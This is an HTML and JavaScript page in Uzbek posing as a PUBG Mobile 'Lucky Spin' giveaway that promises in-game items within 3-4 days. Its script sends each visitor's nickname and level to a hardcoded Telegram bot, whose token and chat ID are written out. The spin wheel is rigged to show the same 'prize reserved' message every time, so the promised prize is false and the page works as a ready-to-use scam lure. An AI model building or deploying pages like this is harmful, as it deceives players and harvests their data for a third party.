<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Mobile - Lucky Spin</title>
    <style>
        :root { --primary: #ffcc00; --bg: #0f0f1a; --glass: rgba(255, 255, 255, 0.1); }
        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: radial-gradient(circle, #1e1e2f, #0f0f1a); color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2); padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); width: 350px; }
        h2 { color: var(--primary); text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px var(--primary); }
        p { font-size: 13px; opacity: 0.8; line-height: 1.5; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: rgba(255,255,255,0.1); color: white; border-bottom: 2px solid var(--primary); outline: none; }
        button { width: 100%; padding: 15px; margin-top: 15px; border-radius: 8px; border: none; background: var(--primary); color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
        button:hover { transform: translateY(-3px); box-shadow: 0 5px 15px var(--primary); }
        .wheel-wrapper { position: relative; width: 250px; height: 250px; margin: 20px auto; border: 5px solid #444; border-radius: 50%; box-shadow: 0 0 20px var(--primary); }
        .wheel { width: 100%; height: 100%; border-radius: 50%; position: relative; overflow: hidden; transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1); background: #222; }
        .pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 25px; height: 35px; background: red; clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 10; }
        .segment { position: absolute; width: 50%; height: 50%; transform-origin: bottom right; display: flex; align-items: center; justify-content: center; clip-path: polygon(0 0, 100% 0, 100% 100%); }
        .segment span { transform: rotate(-45deg) translateY(-15px); font-size: 10px; font-weight: bold; text-shadow: 1px 1px 2px black; }
        #result-text { margin-top: 15px; font-weight: bold; color: #00ff00; }
    </style>
</head>
<body>

    <div class="container">
        <div id="auth-box">
            <h2>PUBG Bonus</h2>
            <p>Nickname va Levelni to'g'ri kiriting. Yutgan narsangiz 3-4 kun atrofida tashlab beriladi.</p>
            <input type="text" id="nickname" placeholder="Nickname kiriting">
            <input type="number" id="level" placeholder="Levelingizni kiriting">
            <button onclick="sendData()">Kirish</button>
        </div>

        <div id="game-box" style="display:none;">
            <h3 id="user-display"></h3>
            <div class="wheel-wrapper">
                <div class="pointer"></div>
                <div id="wheel" class="wheel"></div>
            </div>
            <button id="spin-btn" onclick="spinNow()">Aylantirish</button>
            <p id="result-text"></p>
        </div>
    </div>

    <script>
        // MA'LUMOTLAR
        const TOKEN = "8723367215:AAGLUbYDnoqDJF67MOtDA6HuVDdiqsgxLxM";
        const CHAT_ID = "1730090841"; 

        const prizes = [
            { text: "M416 Glacier", color: "#81d4fa" },
            { text: "660 UC", color: "#ffd54f" },
            { text: "Mythic Outfit", color: "#f06292" },
            { text: "X-Suit", color: "#ba68c8" },
            { text: "Buggy Skin", color: "#4db6ac" },
            { text: "Material", color: "#a1887f" }
        ];

        // G'ildirakni hosil qilish
        const wheel = document.getElementById('wheel');
        prizes.forEach((p, i) => {
            const seg = document.createElement('div');
            seg.className = 'segment';
            seg.style.transform = `rotate(${i * 60}deg)`;
            seg.style.backgroundColor = p.color;
            seg.innerHTML = `<span>${p.text}</span>`;
            wheel.appendChild(seg);
        });

        // Ma'lumotni Telegramga yuborish
        async function sendData() {
            const nick = document.getElementById('nickname').value;
            const lvl = document.getElementById('level').value;

            if(!nick || !lvl) {
                alert("Iltimos, barcha kataklarni to'ldiring!");
                return;
            }

            const text = `🚀 YANGI FOYDALANUVCHI:\n👤 Nick: ${nick}\n📊 Level: ${lvl}`;
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;

            try {
                const response = await fetch(url);
                const data = await response.json();

                if (data.ok) {
                    document.getElementById('auth-box').style.display = 'none';
                    document.getElementById('game-box').style.display = 'block';
                    document.getElementById('user-display').innerText = "Omad yor bo'lsin, " + nick + "!";
                } else {
                    alert("Xato: Botga /start bosganingizni tekshiring!");
                }
            } catch (error) {
                alert("Ulanishda xatolik yuz berdi!");
            }
        }

        // Aylantirish funksiyasi
        function spinNow() {
            const btn = document.getElementById('spin-btn');
            btn.disabled = true;
            btn.style.opacity = "0.5";

            const randomDeg = Math.floor(Math.random() * 360) + 3600; // Kamida 10 marta aylanadi
            document.getElementById('wheel').style.transform = `rotate(${randomDeg}deg)`;

            setTimeout(() => {
                document.getElementById('result-text').innerHTML = "Tabriklaymiz! Sovg'a band qilindi.<br><small>3-4 kun ichida ID raqamingizga yuboriladi.</small>";
            }, 5000);
        }
    </script>
</body>
</html>
